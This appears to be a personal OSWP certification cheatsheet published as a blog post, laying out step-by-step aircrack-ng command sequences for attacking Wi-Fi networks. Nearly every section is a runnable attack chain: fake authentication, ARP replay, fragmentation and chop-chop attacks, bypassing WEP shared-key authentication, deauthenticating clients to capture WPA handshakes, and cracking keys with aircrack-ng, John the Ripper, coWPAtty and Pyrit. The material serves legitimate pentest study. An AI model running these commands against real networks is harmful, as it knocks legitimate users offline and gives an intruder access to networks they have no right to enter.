---
layout: post
title: OSWP personal cheatsheet
tags: [OSWP, Cheatsheet]
description: "OSWP personal cheatsheet"

---

# Table of contents

- [WIFU](#wifu)
  - [Listing wireless access points that are within range](#listing-wireless-access-points-that-are-within-range)
  - [Monitor mode](#monitor-mode)
      - [Up the interface](#up-the-interface)
      - [Show newly created interface](#show-newly-created-interface)
      - [Delete interface](#delete-interface)
    - [Restart network manager](#restart-network-manager)
  - [Aircrack-ng Essentials](#aircrack-ng-essentials)
    - [Airmon-ng](#airmon-ng)
      - [Check/kill process known to interfere](#checkkill-process-known-to-interfere)
      - [Start monitor mode](#start-monitor-mode)
      - [Stop monitor mode](#stop-monitor-mode)
      - [Start on on specific channel](#start-on-on-specific-channel)
    - [Airodump-ng](#airodump-ng)
      - [Capture everything](#capture-everything)
      - [Sniffing more precisely](#sniffing-more-precisely)
    - [Aireplay-ng](#aireplay-ng)
  - [WEP CRACKING](#wep-cracking)
    - [Cracking WEP with Connected Clients](#cracking-wep-with-connected-clients)
      - [THEORY](#theory)
        - [Fake authentication](#fake-authentication)
        - [ARP replay attack](#arp-replay-attack)
        - [Deauthentication attack](#deauthentication-attack)
      - [ATTACK](#attack)
      - [If crack doesn't work](#if-crack-doesnt-work)
        - [Fudge factor](#fudge-factor)
        - [Dictionnary attack](#dictionnary-attack)
    - [Cracking WEP via a Client](#cracking-wep-via-a-client)
      - [ATTACK](#attack)
    - [Cracking Clientless WEP Networks](#cracking-clientless-wep-networks)
      - [Fragmentation Attack](#fragmentation-attack)
      - [Chop Chop Attack](#chop-chop-attack)
    - [Bypassing WEP Shared Key Authentication](#bypassing-wep-shared-key-authentication)
  - [WPA/WPA2 CRACKING](#wpawpa2-cracking)
    - [Cracking WPA/WPA2 PSK with Aircrack-ng](#cracking-wpawpa2-psk-with-aircrack-ng)
    - [Precomputed WPA Keys Database Attack](#precomputed-wpa-keys-database-attack)
      - [Capture the handshake](#capture-the-handshake)
      - [Generate pmk database](#generate-pmk-database)
    - [Cracking WPA with John The Ripper and Aircrack-ng](#cracking-wpa-with-john-the-ripper-and-aircrack-ng)
    - [Cracking WPA with coWPAtty](#cracking-wpa-with-cowpatty)
    - [Cracking WPA with Pyrit](#cracking-wpa-with-pyrit)
    - [Airgraph-ng](#airgraph-ng)
    - [Miscellaneous](#miscellaneous)

# WIFU

## Listing wireless access points that are within range

```
iw dev <INTERFACE> scan | grep SSID:
```

With channel

```
iw dev <INTERFACE> scan | egrep "DS\ Parameter\ set|SSID"
```

## Monitor mode

```
iw dev <INTERFACE> interface add mon0 type monitor
```

#### Up the interface

```
ifconfig mon0 up
```

#### Show newly created interface

```
iwconfig mon0
```

#### Delete interface 

```
iw dev mon0 interface del
```

Can be verify with

```
iwconfig mon0
```

### Restart network manager

```
systemctl restart NetworkManager.service
```

## Aircrack-ng Essentials

### Airmon-ng

Airmon-ng is used to enable and disable monitor mode.

#### Check/kill process known to interfere

```
airmon-ng check kill
```

#### Start monitor mode

```
airmon-ng start <INTERFACE>
```

#### Stop monitor mode

```
# First down the interface
ifconfig <INTERFACE> down

# Then stop monitor mode
airmon-ng stop <INTERFACE>
```

#### Start on on specific channel

```
airmon-ng start <INTERFACE> <CHANNEL_NUMBER>
```

Show that the monitor mode interface is listening on the desired channel :

```
iwlist <INTERFACE> channel
```

### Airodump-ng

Airodump-ng is used for the packet capture of raw 802.11 frames. Prior to running Airodump-ng, your wireless card needs to be in monitor mode.

#### Capture everything

```
airodump-ng -w <CAPTURE_NAME> <INTERFACE>
```

#### Sniffing more precisely

```
# Knowing the channel
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> <INTERFACE>

# Knowing channel and bssid
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>
```

### Aireplay-ng

Aireplay-ng is primarily used to generate or accelerate wireless traffic for the later use with Aircrack-ng to crack WEP and WPA-PSK keys.

## WEP CRACKING

### Cracking WEP with Connected Clients

#### THEORY

##### Fake authentication

The fake authentication attack, allows you to associate to an access point. This attack is useful in scenarios where **there are no associated clients and you need to fake an authentication to the AP**. Note that the fake authentication attack **does not** generate ARP packets so don’t try to use this attack to capture ARP files.

If fake authentication is never successful, then MAC address filtering may be in use. The AP will only accept connections from specific MAC addresses. In this case, you will need to obtain a **valid** MAC address by observing traffic using Airodump-ng and impersonate it once the client goes offline. **Do not** attempt to perform a fake authentication attack for a specific MAC address if the client is still active on the AP.

##### ARP replay attack

The attack listens for an ARP packet and then retransmits it back to the access point. This, in turn, causes the AP to repeat the ARP packet with a new IV. By collecting enough of these IVs, aircrack-ng can then be used to crack the WEP key.

##### Deauthentication attack

After a client is deauthenticated, it will reconnect to the wireless network. During the reconnection stage, there is a high probability that an ARP packet will be sent to the AP. Replaying theses ARP packets will help us force the access point to generate a large number of weak initialization vectors. On WPA/WPA2 networks, the client needs to reauthenticate as it reconnects to the network, allowing us to capture the 4-way handshake.

#### ATTACK

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address
macchanger --show <INTERFACE>

# Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# ARP replay attack
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack 
aircrack-ng <CAPTURE_NAME>
```

#### If crack doesn't work

##### Fudge factor

The fudge factor tells Aircrack-ng how broadly to brute force key spaces. The larger the fudge factor, the more possibilities Aircrack-ng will try to brute force. Try to increase it like so :

```
aircrack-ng -f <FUDGE> <CAPTURE_NAME> 
```

##### Dictionnary attack

```
aircrack-ng -w <PASSWORDS_DICTIONNARY> <CAPTURE_NAME> 
```

### Cracking WEP via a Client

You may be asking yourself why you would want to leverage a wireless client instead of the AP. There are multiple reasons for doing so, a few of which are :

- Some APs max out at 130k unique IVs
- Some APs impose client-to-client controls
- MAC address access controls
- APs that eliminate weak IVs
- You can’t successfully do a fake authentication to the AP
- You are within range of the client but not the AP itself

#### ATTACK

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address
macchanger --show <INTERFACE>

# Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# Interactive packet replay attack
aireplay-ng -2 -b <BSSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <INTERFACE>

or

# Interactive packet replay attack with a capture file
aireplay-ng -2 -r replay_src-<FILE_NAME>.cap <INTERFACE>

# Crack 
aircrack-ng <CAPTURE_NAME>
```

### Cracking Clientless WEP Networks

Some assumptions :

- You are close enough to the AP to send and receive packets. Just because you are close enough to receive packets does not necessarily mean you will be able to transmit packets to the access point.
- There are some data packets coming from the AP. Beacons and management frames are useless for these attacks. A quick way to check for data packets is to run Airodump-ng and see if the #Data field is increasing.
- The AP is using WEP open authentication. If it is running shared key authentication, the only way to execute this attack is to use a previously captured PRGA XOR handshake.

#### Fragmentation Attack

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address
macchanger --show <INTERFACE>

# Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# Fragmentation attack
aireplay-ng -5 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# Forging ARP packet with the xor packet from fragmentation attack
packetforge-ng -0 –a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <FRAGMENT_PACKET>.xor -w <ARP_PACKET_NAME>

# Interactive packet replay attack with the forge ARP packet
aireplay-ng -2 -r <ARP_PACKET_NAME> <INTERFACE>

# Crack 
aircrack-ng <CAPTURE_NAME>
```

#### Chop Chop Attack

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address
macchanger --show <INTERFACE>

# Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# Chop chop attack
aireplay-ng -4 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# Forging ARP packet with the xor packet from chop chop attack 
packetforge-ng -0 –a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <CHOP_CHOP_PACKET>.xor -w <ARP_PACKET_NAME>

# Interactive packet replay attack with the forge ARP packet
aireplay-ng -2 -r <ARP_PACKET_NAME> <INTERFACE>

# Crack 
aircrack-ng <CAPTURE_NAME>
```

### Bypassing WEP Shared Key Authentication

Shared key authentication, requires that the station and AP both have the same WEP key in order to authenticate. If you try to run a fake authentication attack against a WEP network using shared authentication, you will receive an error from Aireplay. The AUTH column will not display SKA until a wireless client authenticates to the network so when you first start sniffing a network, you may not realize it is using shared key authentication until you attempt to run the fake authentication attack against it.

We will run a deauthentication attack against our connected victim client, you can also use the PRGA XOR file obtained via a chopchop or fragmentation attack but it is far faster and easier to deauthenticate a connected client.

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address
macchanger --show <INTERFACE>

# Fake authentication attack (It should failed)
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# Deauthentication attack (If there is a client)
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Fake shared key authentication using the XOR keystream
aireplay-ng -1 60 -e <ESSID> -y wepshared-<NAME>.xor -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# ARP replay attack
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# Deauthentication attack (If there is a client)
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack 
aircrack-ng <CAPTURE_NAME>
```

## WPA/WPA2 CRACKING

### Cracking WPA/WPA2 PSK with Aircrack-ng

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack 
aircrack-ng <CAPTURE_NAME> -w <PASSWORDS_WORDLIST>
```

### Precomputed WPA Keys Database Attack

WPA cracking involves calculating the pairwise master key, from which the Private Transient Key (PTK) is derived. Calculating the PMK is very slow since it uses the pbkdf algorithm, however the PMK is always the same for a given ESSID and password combination. This allows us to pre-compute the PMK for given combinations and speed up the cracking of the WPA/WPA2 handshake.

#### Capture the handshake

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>
```

#### Generate pmk database

```
# Put ESSID inside a file
echo "<ESSID>" > ESSID.txt

# Import ESSID in database
airolib-ng <DB_NAME> --import essid ESSID.txt

# Import passwords list
airolib-ng <DB_NAME> --import passwd <PASSWORDS_WORDLIST>

# Generate pmk
airolib-ng <DB_NAME> --batch

# Crack with precomputed pmk
aircrack-ng –r <DB_NAME> <Handshaked_PCAP>
```

### Cracking WPA with John The Ripper and Aircrack-ng

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack with john
john –wordlist=<PASSWORDS_WORDLIST> --rules –stdout | aircrack-ng -0 –e <ESSID> -w - <CAPTURE_NAME>

or

# Capture to .hccap
aircrack-ng <CAPTURE_NAME> -J john_out

# .hccap to john syntax 
hccap2john john_out.hccap > out

# Crack with john
john –wordlist=<PASSWORDS_WORDLIST> --rules out
```

### Cracking WPA with coWPAtty

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# coWPAtty needs a full valid handshake, check if it can use it
cowpatty -r <CAPTURE_NAME> -c

## IF the handshake is full you can continue ##
## ELSE crack it with aircrack-ng

# Crack (slow better use aircrack-ng)
cowpatty –r <CAPTURE_NAME> -f <PASSWORDS_WORDLIST> -2 –s <SSID>

# Generate hashes for the specific SSID (Slow to generate)
genpmk –s <SSID> –f <PASSWORDS_WORDLIST> -d <HASHES_FILENAME>

# Crack (Very fast)
cowpatty –r <PASSWORDS_WORDLIST> -d <HASHES_FILENAME> -2 –s <SSID>
```

### Cracking WPA with Pyrit

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack (slow better use aircrack-ng)
pyrit –r <CAPTURE_NAME> -b <BSSID> -i <PASSWORDS_WORDLIST> attack_passthrough

or

# Import passwords list
pyrit –i <PASSWORDS_WORDLIST> import_passwords

# Import ESSID in database
pyrit –e <ESSID> create_essid

# Generate hashes for the specific SSID (Slow to generate)
pyrit batch

# Crack (Very fast)
pyrit –r <PCAP_of_FileName> attack_db
```

### Airgraph-ng

Airgraph-ng is a Python script that creates graphs of wireless networks using the CSV files that are generated by Airodump-ng.

```
airgraph-ng -i <FILENAME>.csv -g CAPR -o out.png
```

### Miscellaneous

In WPA/WPA2 if there is no clients connected, try to broadcast deauthenticate.

```
# Deauthentication broadcast attack
aireplay-ng -0 1 -a <BSSID> <INTERFACE>
```